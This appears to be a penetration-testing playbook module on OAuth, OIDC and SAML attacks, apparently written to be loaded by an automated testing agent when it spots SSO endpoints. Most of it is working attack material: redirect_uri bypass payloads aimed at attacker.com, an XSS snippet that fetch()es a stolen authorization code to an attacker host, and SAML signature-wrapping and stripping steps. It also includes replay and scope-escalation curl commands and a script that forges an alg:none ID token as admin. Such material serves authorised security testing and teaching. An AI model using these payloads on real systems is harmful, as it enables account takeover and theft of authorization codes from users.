# OAuth / OIDC / SAML Attacks

## Trigger

Load when you see:

- OAuth endpoints: `/oauth/authorize`, `/oauth/token`, `/connect/authorize`
- Redirect URI parameters: `redirect_uri`, `client_id`, `state`, `response_type`
- `SAMLResponse`, `SAMLRequest`, `RelayState` form parameters
- SSO login flows, "Sign in with Google/Facebook/GitHub" buttons
- `state` parameter in OAuth callback URLs
- `code` parameter in callback URLs (authorization code flow)
- JWT-like tokens with OIDC-specific claims (`iss`, `aud`, `nonce`, `at_hash`)

## Attack Surface

- Weak `redirect_uri` validation (startsWith, substring match, regex bypass)
- Missing or predictable `state` parameter (CSRF login binding)
- Missing PKCE in mobile/SPA applications (authorization code interception)
- Implicit flow tokens leaked in URL fragments (Referer header leakage)
- SAML XML Signature Wrapping (XSW) or missing signature verification
- SAML assertion replay (no InResponseTo / timestamp checks)
- Client secret stored in mobile apps, browser JS, or public repositories

## Decision Tree

1. Check redirect_uri validation: test with `@`, `//`, `\`, path traversal, subdomain tricks
2. Check state parameter: send authorization request WITHOUT state
3. Check PKCE: does the authorization request include `code_challenge`?
4. Check JWT tokens in OIDC: test `alg: none`, algorithm confusion (see auth-jwt module)
5. Check SAML: decode the SAMLResponse, check if signature is enforced
6. Check client_secret exposure: look in mobile app binaries, JS source maps, git history

## Techniques

### OAuth redirect_uri Bypass

```text
# Substring match bypass
redirect_uri=http://target.com.attacker.com/cb
redirect_uri=http://attacker.com/target.com/cb

# @ character: RFC 3986 credentials section
redirect_uri=http://target.com@attacker.com/cb

# Path traversal
redirect_uri=http://target.com/../attacker.com/cb

# Fragment injection
redirect_uri=http://target.com#@attacker.com/cb

# URL encoding
redirect_uri=http://target.com%2f@attacker.com/cb
redirect_uri=http://target.com%2eattacker.com

# Backslash (different parser behavior)
redirect_uri=http://target.com\@attacker.com

# CRLF injection
redirect_uri=http://target.com%0d%0aLocation:%20http://attacker.com
```

### CSRF via Missing state Parameter

```html
<!-- Attacker initiates OAuth with own account, captures authorization code -->
<!-- Sends victim to callback URL with captured code -->
<img src="http://target/callback?code=ATTACKER_CODE&state=PREDICTED_STATE">
<!-- Victim's account links to attacker's OAuth identity -->
```

### PKCE Bypass Detection

```bash
# Check if authorization request includes code_challenge
curl -sI "http://target/oauth/authorize?client_id=X&response_type=code&redirect_uri=...&scope=openid"
# If no code_challenge parameter -> PKCE is disabled -> code interception possible
```

### SAML Signature Wrapping (XSW)

```xml
<!-- Original signed SAML Response -->
<samlp:Response>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion ID="signed_assertion">
    <saml:Subject>victim@target.com</saml:Subject>
  </saml:Assertion>
</samlp:Response>

<!-- XSW: inject malicious assertion outside the signed one -->
<samlp:Response>
  <ds:Signature>...</ds:Signature>
  <saml:Assertion ID="malicious">
    <saml:Subject>admin@target.com</saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="signed_assertion">
    <saml:Subject>victim@target.com</saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### SAML Signature Stripping / Key Substitution

```bash
# Decode, modify, remove signature
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml
# Edit NameID to target user
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > stripped.xml
# Re-encode and send
cat stripped.xml | base64 -w0

# Self-signed certificate injection
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048 -keyout my.key -out my.crt -subj "/CN=Evil IDP"
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml.xml
```

### SAML Assertion Replay

```bash
# Capture a valid SAMLResponse, re-submit it later
curl -d "SAMLResponse=CAPTURED_BASE64&RelayState=/" "http://target/saml/acs"
# If InResponseTo/NotBefore/NotOnOrAfter are not checked, replay succeeds
```

### Token Theft via Implicit Flow

```javascript
// authorization_code in URL query: exfiltrate via Referer
// access_token in URL fragment: exfiltrate via Referer on external resources
// Injected XSS on callback page:
var code = new URLSearchParams(window.location.search).get('code');
fetch('http://attacker.com/log?code=' + encodeURIComponent(code));
```

### Scope Escalation

```bash
# Request higher-privilege scopes
curl "http://target/oauth/authorize?client_id=X&response_type=code&redirect_uri=...&scope=admin+read_write+delete"
# Test if scope validation is enforced on the authorization endpoint
```

### ID Token Manipulation

```python
import jwt, json, base64
token = "eyJ..."  # captured ID token
header, payload, sig = token.split(".")
payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
payload_data["sub"] = "admin"
payload_data["email"] = "admin@target.com"
new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
forged = f"{new_header.decode()}.{new_payload.decode()}."
```

## Bypass

| Block | Bypass |
|-------|--------|
| redirect_uri exact match | URL encoding, `@`, backslash, CRLF, subdomain |
| state required but not validated | Capture a valid state from the target page |
| PKCE required | Check if code_challenge is actually sent in auth request |
| SAML signature verified | XSW (8 variants), signature stripping, self-signed cert injection |
| Response signed but Assertion not | Modify unsigned assertions, keep Response-level signature intact |

## Verification

- redirect_uri bypass: attacker receives the `code` parameter on their server
- SAML XSW: modified NameID results in authentication as the target user
- state CSRF: victim's account becomes linked to attacker's OAuth identity
- Prove by demonstrating code receipt on attacker-controlled endpoint

## Pitfalls

- OAuth `state` is NOT just CSRF protection -- it also binds the auth request to the callback.
  Without it, the auth code can be used by anyone who captures it.
- SAML `RelayState` must match between the initial request and callback or the flow fails.
- Many SAML implementations check whether the Response is signed but not whether the
  Assertion inside it is signed -- a critical distinction (Response-level signature wrapping).
- Scope escalation requires the authorization server to NOT validate against a registered allowlist.
- PKCE is only relevant for public clients (SPA/mobile) -- confidential clients with client_secret
  don't need it, but missing PKCE is still a finding for public clients.
